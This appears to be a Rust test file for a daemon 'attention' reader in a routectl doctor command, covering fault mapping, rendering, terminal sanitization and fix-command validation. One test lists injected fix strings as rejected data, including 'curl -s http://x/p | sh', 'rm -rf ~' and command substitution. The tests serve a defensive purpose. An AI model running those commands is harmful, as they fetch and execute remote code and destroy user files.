//! Coverage for the daemon attention reader: every way of not getting a list
//! maps to its reason, the lenient shape tolerates what a newer daemon adds,
//! the rendered block carries the source, items and bare fixes, and no wire
//! string reaches the terminal unsanitized.

use std::time::Duration;

use routectl_router::{Config, ServerConfig};
use serde_json::{Value, json};
use wiremock::matchers::{method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

use super::*;
use crate::commands::doctor::attention::Attention;
use crate::commands::doctor::sections::oauth_login_command;
use crate::commands::seat::shell_word;

/// A config whose server address points at `base_url`'s host and port.
fn config_pointing_at(base_url: &str) -> Config {
    let authority = base_url
        .strip_prefix("http://")
        .expect("mock server base url is http");
    let (host, port) = authority
        .rsplit_once(':')
        .expect("mock server base url carries a port");
    config_at(host, port.parse().expect("mock port parses"))
}

fn config_at(host: &str, port: u16) -> Config {
    Config {
        server: ServerConfig {
            host: host.to_string(),
            port,
            ..ServerConfig::default()
        },
        ..Config::default()
    }
}

fn item(key: &str) -> Value {
    json!({
        "key": key,
        "kind": "pool_empty",
        "severity": "broken",
        "state": "active",
        "subject": "pool seats",
        "account": null,
        "cause": "no usable seat",
        "raw_token": "pool_empty (seats)",
        "since_ms": null,
        "until_ms": null,
        "recovered_at_ms": null,
        "fix": null,
        "remediation": null,
        "target": "accounts",
    })
}

fn envelope_with(items: Vec<Value>) -> Value {
    json!({
        "schema_version": 1,
        "as_of": "2026-11-20T10:00:00Z",
        "unavailable": null,
        "data": {
            "verdict": {"severity": "broken", "text": "pool seats: no usable seat", "target": "accounts"},
            "counts": {"broken": items.len(), "degraded": 0, "recovered": 0, "doctor_fail": 0},
            "coverage": {"doctor": "current"},
            "items": items,
        },
    })
}

/// The list a daemon with nothing listed serves: the builder's own verdict
/// over zero items, in the v1 envelope.
fn healthy_envelope() -> Value {
    let attention = Attention::from_items(Vec::new());
    json!({
        "schema_version": 1,
        "as_of": "2026-11-20T10:00:00Z",
        "unavailable": null,
        "data": {
            "verdict": attention.verdict,
            "counts": attention.counts,
            "coverage": {"doctor": "current"},
            "items": attention.items,
        },
    })
}

/// `body` as served by a daemon at a fixed address.
fn served(body: &Value) -> DaemonAttention {
    let parsed = parse(&serde_json::to_vec(body).expect("serializes")).expect("parses");
    DaemonAttention {
        address: "http://127.0.0.1:9100/status/attention".to_string(),
        schema_version: parsed.schema_version,
        as_of: parsed.as_of,
        data: parsed.data,
        list: parsed.list,
    }
}

async fn mock_answering(response: ResponseTemplate) -> MockServer {
    let daemon = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path(ATTENTION_PATH))
        .respond_with(response)
        .mount(&daemon)
        .await;
    daemon
}

async fn reason_for(response: ResponseTemplate) -> Reason {
    let daemon = mock_answering(response).await;
    fetch(&config_pointing_at(&daemon.uri()))
        .await
        .expect_err("the read must fail")
        .reason
}

// --- A served list ---

#[tokio::test]
async fn a_served_v1_list_is_read_with_its_address_and_raw_data() {
    // Arrange
    let body = envelope_with(vec![item("pool_empty:seats")]);
    let daemon = mock_answering(ResponseTemplate::new(200).set_body_json(&body)).await;

    // Act
    let read = fetch(&config_pointing_at(&daemon.uri()))
        .await
        .expect("a list");

    // Assert
    assert_eq!(read.address, format!("{}{ATTENTION_PATH}", daemon.uri()));
    assert_eq!(read.schema_version, 1);
    assert_eq!(read.as_of, "2026-11-20T10:00:00Z");
    assert_eq!(read.data, body["data"]);
    assert_eq!(read.list.items.len(), 1);
}

// --- Fault table ---

#[tokio::test]
async fn a_refused_connection_reads_not_running() {
    // Arrange: a bound socket that never listens, so the dial is refused.
    let socket = tokio::net::TcpSocket::new_v4().expect("socket");
    socket.bind("127.0.0.1:0".parse().unwrap()).expect("bind");
    let port = socket.local_addr().expect("addr").port();

    // Act
    let failure = fetch(&config_at("127.0.0.1", port))
        .await
        .expect_err("refused");

    // Assert
    assert_eq!(failure.reason, Reason::NotRunning);
    drop(socket);
}

#[tokio::test]
async fn a_listener_that_never_answers_reads_timeout() {
    // Arrange: accept every connection and hold it open without a byte back.
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0")
        .await
        .expect("bind");
    let port = listener.local_addr().expect("addr").port();
    let holder = tokio::spawn(async move {
        let accepted = listener.accept().await;
        std::future::pending::<()>().await;
        drop(accepted);
    });

    // Act
    let failure = fetch_within(&config_at("127.0.0.1", port), Duration::from_millis(200))
        .await
        .expect_err("times out");

    // Assert
    assert_eq!(failure.reason, Reason::Timeout);
    holder.abort();
}

#[tokio::test]
async fn an_http_status_maps_to_its_reason() {
    for (name, status, expected) in [
        ("404 not served", 404, Reason::NotServed),
        ("401 auth refused", 401, Reason::AuthRefused),
        ("503 busy", 503, Reason::Busy),
        ("500 unrecognized", 500, Reason::Unrecognized),
        ("204 unrecognized", 204, Reason::Unrecognized),
    ] {
        // Act
        let reason =
            reason_for(ResponseTemplate::new(status).set_body_json(envelope_with(vec![item("k")])))
                .await;

        // Assert
        assert_eq!(reason, expected, "{name}");
    }
}

#[tokio::test]
async fn an_unacceptable_200_body_reads_unrecognized() {
    let mut schema_two = envelope_with(vec![item("k")]);
    schema_two["schema_version"] = json!(2);
    let over_items = envelope_with((0..=MAX_ITEMS).map(|i| item(&format!("k{i}"))).collect());
    let mut over_bytes = envelope_with(vec![item("k")]);
    over_bytes["data"]["padding"] = json!("x".repeat(MAX_BODY_BYTES));
    let unavailable = json!({
        "schema_version": 1, "as_of": null, "data": null, "unavailable": "db_unavailable",
    });
    let no_items = json!({"schema_version": 1, "as_of": "t", "data": {"verdict": {}}});
    for (name, body) in [
        ("not json", b"<html>hello</html>".to_vec()),
        ("schema_version 2", serde_json::to_vec(&schema_two).unwrap()),
        ("513 items", serde_json::to_vec(&over_items).unwrap()),
        ("body over 1 MiB", serde_json::to_vec(&over_bytes).unwrap()),
        (
            "unavailable envelope",
            serde_json::to_vec(&unavailable).unwrap(),
        ),
        ("data missing items", serde_json::to_vec(&no_items).unwrap()),
    ] {
        // Act
        let reason = reason_for(ResponseTemplate::new(200).set_body_bytes(body)).await;

        // Assert
        assert_eq!(reason, Reason::Unrecognized, "{name}");
    }
}

/// Positive control for the two cap rows: exactly at the item cap, the list
/// is read whole.
#[tokio::test]
async fn exactly_max_items_is_read_whole() {
    // Arrange
    let body = envelope_with((0..MAX_ITEMS).map(|i| item(&format!("k{i}"))).collect());
    let daemon = mock_answering(ResponseTemplate::new(200).set_body_json(&body)).await;

    // Act
    let read = fetch(&config_pointing_at(&daemon.uri()))
        .await
        .expect("a list");

    // Assert
    assert_eq!(read.list.items.len(), MAX_ITEMS);
}

#[test]
fn an_unavailable_envelope_keeps_the_daemon_code_sanitized_and_capped() {
    // Arrange
    let code = format!("db\u{1b}[2J\u{9b}\n{}", "z".repeat(200));
    let body = json!({"schema_version": 1, "as_of": null, "data": null, "unavailable": code});

    // Act
    let failure = parse(&serde_json::to_vec(&body).unwrap()).expect_err("unavailable");

    // Assert
    assert_eq!(failure.reason, Reason::Unrecognized);
    let shown = failure.daemon_code.expect("code kept");
    assert_eq!(shown.chars().count(), MAX_DAEMON_CODE_CHARS);
    assert!(shown.starts_with("db?[2J??z"), "{shown}");
}

#[tokio::test]
async fn a_redirect_reads_unrecognized_and_is_not_followed() {
    // Arrange
    let elsewhere = MockServer::start().await;
    Mock::given(wiremock::matchers::any())
        .respond_with(ResponseTemplate::new(200).set_body_json(healthy_envelope()))
        .mount(&elsewhere)
        .await;
    let location = format!("{}{ATTENTION_PATH}", elsewhere.uri());

    // Act
    let reason =
        reason_for(ResponseTemplate::new(302).insert_header("location", location.as_str())).await;

    // Assert
    assert_eq!(reason, Reason::Unrecognized);
    let hops = elsewhere.received_requests().await.expect("records");
    assert!(hops.is_empty(), "a redirect target must receive nothing");
}

#[tokio::test]
async fn a_non_loopback_bind_reads_no_loopback_address_without_dialing() {
    // Act
    let failure = fetch(&config_at("localhost", 9))
        .await
        .expect_err("refused");

    // Assert
    assert_eq!(failure.reason, Reason::NoLoopbackAddress);
    assert_eq!(failure.address, None);
}

// --- Lenient shape ---

#[test]
fn an_unknown_kind_and_field_render_generically() {
    // Arrange
    let mut unknown = item("provider_failing:deepseek");
    unknown["kind"] = json!("provider_failing");
    unknown["severity"] = json!("critical");
    unknown["subject"] = json!("provider deepseek");
    unknown["cause"] = json!("every target failing for 5m");
    unknown["raw_token"] = json!("provider_failing (deepseek)");
    unknown["targets"] = json!(["deepseek#v4", "deepseek#r2"]);
    let mut body = envelope_with(vec![unknown]);
    body["data"]["coverage"]["held_since"] = json!(12);

    // Act
    let lines = render(&served(&body));

    // Assert
    let text = lines.join("\n");
    assert!(
        text.contains("critical provider_failing: provider deepseek: every target failing for 5m"),
        "{text}"
    );
    assert!(text.contains("raw: provider_failing (deepseek)"), "{text}");
}

// --- Rendered lines ---

#[test]
fn the_block_names_its_source_items_and_bare_fixes() {
    // Arrange
    let mut with_fix = item("account_unusable:seat");
    with_fix["kind"] = json!("account_unusable");
    with_fix["severity"] = json!("degraded");
    with_fix["subject"] = json!("claude-seat (a)");
    with_fix["cause"] = json!("not logged in for 2h");
    with_fix["raw_token"] = json!("account_unusable (not_logged_in)");
    with_fix["fix"] = json!("routectl login claude-seat");
    let mut recovered = item("pool_empty:backup");
    recovered["state"] = json!("recovered");
    recovered["remediation"] = json!("add a seat to `backup`");
    let body = envelope_with(vec![with_fix, recovered]);

    // Act
    let lines = render(&served(&body));

    // Assert
    assert_eq!(lines[0], BLOCK_TITLE);
    assert_eq!(
        lines[1],
        "  source: daemon at http://127.0.0.1:9100/status/attention, as of \
         2026-11-20T10:00:00Z, doctor coverage current"
    );
    assert_eq!(lines[2], "  verdict: broken: pool seats: no usable seat");
    assert_eq!(
        lines[3],
        "  counts: broken 2  degraded 0  recovered 0  doctor_fail 0"
    );
    assert_eq!(
        &lines[4..],
        [
            "  degraded account_unusable: claude-seat (a): not logged in for 2h",
            "      raw: account_unusable (not_logged_in)",
            "      fix: routectl login claude-seat",
            "  broken pool_empty (recovered): pool seats: no usable seat",
            "      raw: pool_empty (seats)",
            "      remediation: add a seat to `backup`",
        ]
    );
}

#[test]
fn no_failure_reason_renders_a_verdict() {
    for reason in Reason::ALL {
        // Arrange
        let failure = Unavailable::new(reason, Some("http://127.0.0.1:9100/x".to_string()));

        // Act
        let line = render_unavailable(&failure);

        // Assert
        assert!(line.contains(reason.as_str()), "{line}");
        assert!(line.contains("needs the running daemon"), "{line}");
        assert!(!line.contains("verdict"), "{line}");
        assert!(!line.contains("healthy"), "{line}");
    }
}

/// Paired control for the row above: a served zero-item list does render the
/// builder's healthy verdict.
#[test]
fn a_served_empty_list_renders_its_healthy_verdict() {
    // Act
    let lines = render(&served(&healthy_envelope()));

    // Assert
    assert_eq!(lines[2], "  verdict: ok: All routes healthy");
    assert_eq!(lines.len(), 4, "{lines:?}");
}

// --- Terminal safety ---

const PLANT: &str = "x\u{1b}[2J\u{9b}31m\nnext\rback\u{202e}y";

fn planted_body() -> Value {
    let planted_item = json!({
        "key": PLANT,
        "kind": PLANT,
        "severity": PLANT,
        "state": PLANT,
        "subject": PLANT,
        "cause": PLANT,
        "raw_token": PLANT,
        "fix": PLANT,
        "remediation": PLANT,
    });
    json!({
        "schema_version": 1,
        "as_of": PLANT,
        "data": {
            "verdict": {"severity": PLANT, "text": PLANT},
            "counts": {"broken": 1, "degraded": 0, "recovered": 0, "doctor_fail": 0},
            "coverage": {"doctor": PLANT},
            "items": [planted_item],
        },
    })
}

fn assert_terminal_safe(output: &str) {
    for (index, c) in output.chars().enumerate() {
        assert!(
            c == '\n' || c == ' ' || c.is_ascii_graphic(),
            "char {index} ({:?}) reaches the terminal: {output:?}",
            c
        );
    }
}

#[test]
fn planted_control_characters_never_reach_the_terminal() {
    // Arrange: one item with every field set, so the line count is fixed by
    // the renderer alone: title, source, verdict, counts, item, raw, fix,
    // remediation.
    let attention = served(&planted_body());
    let failure = Unavailable {
        reason: Reason::Unrecognized,
        address: None,
        daemon_code: Some(PLANT.to_string()),
    };

    // Act
    let mut lines = render(&attention);
    lines.push(render_unavailable(&failure));
    let output = lines.join("\n");

    // Assert
    assert_terminal_safe(&output);
    assert_eq!(output.lines().count(), 9, "{output}");
    assert!(
        output.lines().all(|line| !line.starts_with("next")),
        "a planted line feed started a line: {output}"
    );
    assert!(output.contains("x?[2J?31m?next?back?y"), "{output}");
}

#[test]
fn an_over_cap_cause_is_truncated_at_the_module_cap() {
    // Arrange
    let mut long = item("k");
    long["cause"] = json!(format!("{}TAIL", "c".repeat(MAX_CAUSE_CHARS)));
    let body = envelope_with(vec![long]);

    // Act
    let lines = render(&served(&body));

    // Assert
    let item_line = &lines[4];
    let cause = item_line
        .rsplit_once(": ")
        .expect("the cause follows the subject")
        .1;
    assert_eq!(cause, "c".repeat(MAX_CAUSE_CHARS));
    assert!(!item_line.contains("TAIL"), "{item_line}");
}

// --- Fix shape ---

#[test]
fn every_command_the_daemon_serves_as_a_fix_is_accepted() {
    // Arrange: the producer's own output, so the accepted set tracks it.
    let rows = [
        ("plain", oauth_login_command("claude-seat", None)),
        (
            "labeled plain",
            oauth_login_command("claude-seat", Some("work.2")),
        ),
        (
            "labeled quoted",
            oauth_login_command("claude-seat", Some("my seat")),
        ),
        (
            "labeled with an escaped quote",
            oauth_login_command("claude-seat", Some("bob's seat")),
        ),
        (
            "labeled empty",
            oauth_login_command("claude-seat", Some("")),
        ),
    ];
    assert_eq!(rows[2].1, "routectl login claude-seat --label 'my seat'");
    assert_eq!(
        rows[3].1,
        format!(
            "routectl login claude-seat --label {}",
            shell_word("bob's seat")
        )
    );
    assert!(rows[3].1.contains("'\\''"), "{}", rows[3].1);

    for (name, fix) in rows {
        // Act
        let line = fix_line(&fix);

        // Assert
        assert_eq!(line, format!("      fix: {fix}"), "row {name}");
    }
}

#[test]
fn a_fix_outside_the_login_shape_is_not_shown_as_a_command() {
    // Arrange
    let rows = [
        (
            "semicolon",
            "routectl login anthropic; curl -s http://x/p | sh",
        ),
        ("and-and", "routectl login anthropic && rm -rf ~"),
        ("command substitution", "routectl login $(id)"),
        ("backtick", "routectl login `id`"),
        ("backticked whole command", "`routectl login anthropic`"),
        ("pipe", "routectl login anthropic | sh"),
        (
            "newline replaced by the sanitizer",
            "routectl login anthropic\nsh x",
        ),
        (
            "trailing text after a plain label",
            "routectl login anthropic --label a b",
        ),
        (
            "trailing text after a quoted label",
            "routectl login anthropic --label 'a' b",
        ),
        (
            "second label",
            "routectl login anthropic --label a --label b",
        ),
        ("unbalanced quote", "routectl login anthropic --label 'a"),
        (
            "bare quote inside a quoted label",
            "routectl login anthropic --label 'a'b'",
        ),
        (
            "half escape inside a quoted label",
            "routectl login anthropic --label 'a'\\'b'",
        ),
        ("quoted provider", "routectl login 'anthropic'"),
        ("empty provider", "routectl login "),
        ("double space", "routectl login  anthropic"),
        ("other subcommand", "routectl logout anthropic"),
        ("other flag", "routectl login anthropic --force"),
    ];

    for (name, fix) in rows {
        // Act
        let line = fix_line(fix);

        // Assert
        assert!(
            line.starts_with("      fix (not a recognized command, not shown as one): "),
            "row {name}: {line}"
        );
        assert!(!line.starts_with("      fix: "), "row {name}: {line}");
    }
}

#[test]
fn a_rejected_fix_keeps_its_sanitized_text_visible() {
    // Act
    let line = fix_line("routectl login `id`\u{1b}[2J");

    // Assert
    assert_eq!(
        line,
        "      fix (not a recognized command, not shown as one): routectl login `id`?[2J"
    );
}
